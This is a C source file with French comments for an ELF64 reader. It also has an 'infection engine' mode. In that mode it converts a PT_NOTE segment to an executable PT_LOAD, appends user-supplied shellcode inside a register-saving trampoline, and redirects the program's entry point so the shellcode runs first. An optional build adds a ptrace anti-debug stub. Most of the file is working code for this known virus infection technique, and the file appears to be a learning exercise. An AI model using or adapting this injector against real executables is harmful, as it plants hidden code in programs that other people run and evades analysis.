/*
 * elf_parser.c — Lecteur ELF64 + Moteur d'infection (Personne A)
 *
 * Phase A (lecture) : affiche l'en-tête et les program headers.
 * Phase B (injection) :
 *   CASE 1 : Conversion PT_NOTE → PT_LOAD
 *   CASE 2 : Insertion du shellcode + trampoline retour e_entry
 *   CASE 3 : Protected ELF (anti-debug)  [optionnel -DPROTECTED_ELF]
 *
 * Compilation :
 *   gcc -Wall -Wextra -o elf_parser elf_parser.c
 *   gcc -Wall -Wextra -DPROTECTED_ELF -o elf_parser_protected elf_parser.c
 *
 * Usage :
 *   ./elf_parser <fichier_elf>              → mode lecture
 *   ./elf_parser <fichier_elf> <sc.bin>     → mode injection
 *
 * ATTENTION : en mode injection, le fichier cible est MODIFIÉ.
 *             Travailler sur une COPIE.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <elf.h>

/* ============================================================
 * PARTIE 1 — LECTURE (ton code d'origine)
 * ============================================================ */

/* Traduit un p_type (valeur numerique) en nom lisible. */
static const char *nom_type_segment(Elf64_Word type) {
    switch (type) {
        case PT_NULL:         return "NULL";
        case PT_LOAD:         return "LOAD";
        case PT_DYNAMIC:      return "DYNAMIC";
        case PT_INTERP:       return "INTERP";
        case PT_NOTE:         return "NOTE";
        case PT_SHLIB:        return "SHLIB";
        case PT_PHDR:         return "PHDR";
        case PT_TLS:          return "TLS";
        case PT_GNU_EH_FRAME: return "GNU_EH_FRAME";
        case PT_GNU_STACK:    return "GNU_STACK";
        case PT_GNU_RELRO:    return "GNU_RELRO";
        case PT_GNU_PROPERTY: return "GNU_PROPERTY";
        default:              return "AUTRE";
    }
}

/* Lit l'en-tete ELF dans 'ehdr'. Verifie le magic + classe 64 bits.
   Retourne 0 si OK, -1 en cas d'erreur. */
static int lire_entete(FILE *f, Elf64_Ehdr *ehdr) {
    if (fseek(f, 0, SEEK_SET) != 0) {
        perror("fseek(entete)");
        return -1;
    }
    if (fread(ehdr, sizeof(*ehdr), 1, f) != 1) {
        fprintf(stderr, "Erreur : fichier trop petit pour un en-tete ELF64.\n");
        return -1;
    }
    if (memcmp(ehdr->e_ident, ELFMAG, SELFMAG) != 0) {
        fprintf(stderr, "Erreur : ce fichier n'est pas un ELF.\n");
        return -1;
    }
    if (ehdr->e_ident[EI_CLASS] != ELFCLASS64) {
        fprintf(stderr, "Erreur : binaire non 64 bits (non supporte).\n");
        return -1;
    }
    return 0;
}

/* Affiche les champs cles de l'en-tete. */
static void afficher_entete(const Elf64_Ehdr *ehdr) {
    printf("== En-tete ELF ==\n");
    printf("  Type (e_type)        : %u\n", ehdr->e_type);
    printf("  Point d'entree       : 0x%lx\n", (unsigned long)ehdr->e_entry);
    printf("  Offset des phdr      : %lu\n",   (unsigned long)ehdr->e_phoff);
    printf("  Nombre de phdr       : %u\n",    ehdr->e_phnum);
    printf("  Taille d'un phdr     : %u\n\n",  ehdr->e_phentsize);
}

/* Lit et affiche la table des program headers.
   Retourne 0 si OK, -1 en cas d'erreur. */
static int afficher_program_headers(FILE *f, const Elf64_Ehdr *ehdr) {
    if (fseek(f, ehdr->e_phoff, SEEK_SET) != 0) {
        perror("fseek(phdr)");
        return -1;
    }

    printf("== Program headers (%u) ==\n", ehdr->e_phnum);
    printf("  #   Type          Offset      VirtAddr      FileSiz   Flags\n");

    for (unsigned int i = 0; i < ehdr->e_phnum; i++) {
        Elf64_Phdr phdr;
        if (fread(&phdr, sizeof(phdr), 1, f) != 1) {
            fprintf(stderr, "Erreur : lecture du phdr %u impossible.\n", i);
            return -1;
        }
        printf("  %-2u  %-12s  0x%08lx  0x%010lx  0x%06lx  %c%c%c\n",
               i,
               nom_type_segment(phdr.p_type),
               (unsigned long)phdr.p_offset,
               (unsigned long)phdr.p_vaddr,
               (unsigned long)phdr.p_filesz,
               (phdr.p_flags & PF_R) ? 'R' : '-',
               (phdr.p_flags & PF_W) ? 'W' : '-',
               (phdr.p_flags & PF_X) ? 'E' : '-');
    }
    return 0;
}

/* ============================================================
 * PARTIE 2 — CASE 3 : stub anti-debug (Protected ELF)
 * ============================================================ */
#ifdef PROTECTED_ELF
/* ptrace(PTRACE_TRACEME) → si retour == -1 → debugger attaché → exit */
static const unsigned char stub_antidebug[] = {
    0x48, 0xC7, 0xC0, 0x65, 0x00, 0x00, 0x00,   /* mov rax, 101    */
    0x48, 0x31, 0xFF,                            /* xor rdi, rdi    */
    0x48, 0x31, 0xF6,                            /* xor rsi, rsi    */
    0x48, 0x31, 0xD2,                            /* xor rdx, rdx    */
    0x49, 0x31, 0xD2,                            /* xor r10, r10    */
    0x0F, 0x05,                                  /* syscall         */
    0x48, 0x83, 0xF8, 0xFF,                      /* cmp rax, -1     */
    0x75, 0x06,                                  /* jne continuer   */
    0x6A, 0x3C, 0x58, 0x0F, 0x05                 /* exit(60)        */
};
#endif

/* ============================================================
 * PARTIE 3 — CASE 1 : Conversion PT_NOTE → PT_LOAD
 * ============================================================ */

/* Trouve l'index du premier PT_NOTE. Retourne -1 si aucun. */
static int trouver_pt_note(const Elf64_Ehdr *ehdr, const Elf64_Phdr *ph) {
    for (int i = 0; i < ehdr->e_phnum; i++)
        if (ph[i].p_type == PT_NOTE) return i;
    return -1;
}

/* Retourne la vaddr max parmi les segments LOAD. */
static Elf64_Addr vaddr_max_load(const Elf64_Ehdr *ehdr, const Elf64_Phdr *ph) {
    Elf64_Addr max = 0;
    for (int i = 0; i < ehdr->e_phnum; i++) {
        if (ph[i].p_type == PT_LOAD) {
            Elf64_Addr fin = ph[i].p_vaddr + ph[i].p_memsz;
            if (fin > max) max = fin;
        }
    }
    return max;
}

/* Convertit le phdr d'index idx en PT_LOAD exécutable. */
static void convertir_en_load(Elf64_Phdr *ph, int idx,
                              Elf64_Off offset, Elf64_Addr vaddr,
                              Elf64_Xword taille) {
    ph[idx].p_type   = PT_LOAD;
    ph[idx].p_flags  = PF_R | PF_X;
    ph[idx].p_offset = offset;
    ph[idx].p_vaddr  = vaddr;
    ph[idx].p_paddr  = vaddr;
    ph[idx].p_filesz = taille;
    ph[idx].p_memsz  = taille;
    ph[idx].p_align  = 0x1000;
}

/* ============================================================
 * PARTIE 4 — CASE 2 : Payload = trampoline + shellcode + retour e_entry
 * ============================================================ */

/* Construit :
 *   [push regs]  [shellcode user]  [pop regs]  [jmp ancienne_entry]
 */
static unsigned char *construire_payload(const unsigned char *sc,
                                         size_t sc_len,
                                         Elf64_Addr ancienne_entry,
                                         size_t *out_len) {
    /* push rax,rbx,rcx,rdx,rsi,rdi,rbp,r8,r9,r10,r11 */
    static const unsigned char prologue[] = {
        0x50, 0x53, 0x51, 0x52, 0x56, 0x57, 0x55,
        0x41, 0x50, 0x41, 0x51, 0x41, 0x52, 0x41, 0x53
    };
    /* pop r11,r10,r9,r8,rbp,rdi,rsi,rdx,rcx,rbx,rax */
    static const unsigned char epilogue[] = {
        0x41, 0x5B, 0x41, 0x5A, 0x41, 0x59, 0x41, 0x58,
        0x5D, 0x5F, 0x5E, 0x5A, 0x59, 0x5B, 0x58
    };
    /* movabs rax, imm64 ; jmp rax */
    unsigned char saut[12] = { 0x48, 0xB8 };
    memcpy(&saut[2], &ancienne_entry, 8);
    saut[10] = 0xFF;
    saut[11] = 0xE0;

    size_t total = sizeof(prologue) + sc_len + sizeof(epilogue) + sizeof(saut);
    unsigned char *buf = malloc(total);
    if (!buf) return NULL;

    size_t o = 0;
    memcpy(buf + o, prologue, sizeof(prologue)); o += sizeof(prologue);
    memcpy(buf + o, sc, sc_len);                 o += sc_len;
    memcpy(buf + o, epilogue, sizeof(epilogue)); o += sizeof(epilogue);
    memcpy(buf + o, saut, sizeof(saut));

    *out_len = total;
    return buf;
}

/* ============================================================
 * PARTIE 5 — Fonction d'injection (mode 2 arguments)
 * ============================================================ */
static int injecter(const char *chemin_elf, const char *chemin_sc) {
    /* 1. Lire le shellcode */
    FILE *fsc = fopen(chemin_sc, "rb");
    if (!fsc) { perror("fopen(shellcode)"); return EXIT_FAILURE; }

    fseek(fsc, 0, SEEK_END);
    long sc_taille = ftell(fsc);
    fseek(fsc, 0, SEEK_SET);

    unsigned char *sc = malloc(sc_taille);
    if (!sc) { perror("malloc"); fclose(fsc); return EXIT_FAILURE; }
    if (fread(sc, 1, sc_taille, fsc) != (size_t)sc_taille) {
        perror("fread(shellcode)"); return EXIT_FAILURE;
    }
    fclose(fsc);

    /* 2. Ouvrir l'ELF en lecture/écriture */
    FILE *f = fopen(chemin_elf, "r+b");
    if (!f) { perror("fopen(elf)"); return EXIT_FAILURE; }

    /* 3. Lire l'en-tête */
    Elf64_Ehdr ehdr;
    if (fread(&ehdr, sizeof(ehdr), 1, f) != 1) {
        perror("fread(Ehdr)"); return EXIT_FAILURE;
    }
    if (memcmp(ehdr.e_ident, ELFMAG, SELFMAG) != 0) {
        fprintf(stderr, "Pas un ELF.\n"); return EXIT_FAILURE;
    }
    if (ehdr.e_ident[EI_CLASS] != ELFCLASS64 ||
        ehdr.e_ident[EI_DATA]  != ELFDATA2LSB) {
        fprintf(stderr, "ELF64 little-endian requis.\n");
        return EXIT_FAILURE;
    }

    /* 4. Lire les program headers */
    Elf64_Phdr *ph = malloc(ehdr.e_phnum * sizeof(Elf64_Phdr));
    if (!ph) { perror("malloc(phdr)"); return EXIT_FAILURE; }
    fseek(f, ehdr.e_phoff, SEEK_SET);
    fread(ph, sizeof(Elf64_Phdr), ehdr.e_phnum, f);

    /* ========== CASE 1 : PT_NOTE → PT_LOAD ========== */
    int idx = trouver_pt_note(&ehdr, ph);
    if (idx < 0) {
        fprintf(stderr, "Aucun PT_NOTE dans ce binaire.\n");
        free(ph); free(sc); fclose(f);
        return EXIT_FAILURE;
    }
    printf("[+] PT_NOTE trouvé à l'index %d\n", idx);

    fseek(f, 0, SEEK_END);
    long fin_fichier = ftell(f);
    long new_offset  = (fin_fichier + 0xFFF) & ~0xFFFL;

    Elf64_Addr vaddr = (vaddr_max_load(&ehdr, ph) + 0xFFF) & ~0xFFFULL;
    vaddr += 0x1000;

    /* ========== CASE 2 : construire le payload ========== */
    Elf64_Addr ancienne_entry = ehdr.e_entry;
    size_t payload_len;
    unsigned char *payload = construire_payload(sc, sc_taille,
                                                ancienne_entry, &payload_len);
    if (!payload) { perror("construire_payload"); return EXIT_FAILURE; }

    /* ========== CASE 3 : ajouter le stub anti-debug ========== */
#ifdef PROTECTED_ELF
    size_t total = sizeof(stub_antidebug) + payload_len;
    unsigned char *pp = malloc(total);
    if (!pp) { perror("malloc(protégé)"); return EXIT_FAILURE; }
    memcpy(pp, stub_antidebug, sizeof(stub_antidebug));
    memcpy(pp + sizeof(stub_antidebug), payload, payload_len);
    free(payload);
    payload     = pp;
    payload_len = total;
#endif

    /* 5. Convertir le PT_NOTE avec la taille finale */
    convertir_en_load(ph, idx, new_offset, vaddr, payload_len);

    /* 6. Rediriger e_entry */
    ehdr.e_entry = vaddr;

    /* 7. Réécrire l'en-tête */
    fseek(f, 0, SEEK_SET);
    fwrite(&ehdr, sizeof(ehdr), 1, f);

    /* 8. Réécrire la table des PH */
    fseek(f, ehdr.e_phoff, SEEK_SET);
    fwrite(ph, sizeof(Elf64_Phdr), ehdr.e_phnum, f);

    /* 9. Écrire le payload à la fin */
    fseek(f, new_offset, SEEK_SET);
    for (long i = fin_fichier; i < new_offset; i++) fputc(0x90, f);
    fwrite(payload, 1, payload_len, f);

    printf("[+] PT_NOTE (idx=%d) converti en PT_LOAD\n", idx);
    printf("[+] vaddr=0x%lx  offset=0x%lx  taille=%zu\n",
           (unsigned long)vaddr, (unsigned long)new_offset, payload_len);
    printf("[+] e_entry : 0x%lx → 0x%lx\n",
           (unsigned long)ancienne_entry, (unsigned long)ehdr.e_entry);
#ifdef PROTECTED_ELF
    printf("[+] Protected ELF : anti-debug activé\n");
#endif
    printf("[+] Terminé.\n");

    free(payload); free(sc); free(ph); fclose(f);
    return EXIT_SUCCESS;
}

/* ============================================================
 * MAIN
 * ============================================================ */
int main(int argc, char *argv[]) {
    if (argc < 2 || argc > 3) {
        fprintf(stderr,
                "Usage :\n"
                "  %s <fichier_elf>              (lecture seule)\n"
                "  %s <fichier_elf> <sc.bin>     (injection)\n",
                argv[0], argv[0]);
        return EXIT_FAILURE;
    }

    /* Mode injection (2 arguments) → on délègue à injecter() */
    if (argc == 3)
        return injecter(argv[1], argv[2]);

    /* Mode lecture (1 argument) → comportement d'origine */
    FILE *f = fopen(argv[1], "rb");
    if (f == NULL) {
        perror("fopen");
        return EXIT_FAILURE;
    }

    Elf64_Ehdr ehdr;
    int code = EXIT_SUCCESS;

    if (lire_entete(f, &ehdr) != 0) {
        code = EXIT_FAILURE;
        goto fin;
    }
    afficher_entete(&ehdr);

    if (afficher_program_headers(f, &ehdr) != 0) {
        code = EXIT_FAILURE;
        goto fin;
    }

fin:
    fclose(f);
    return code;
}
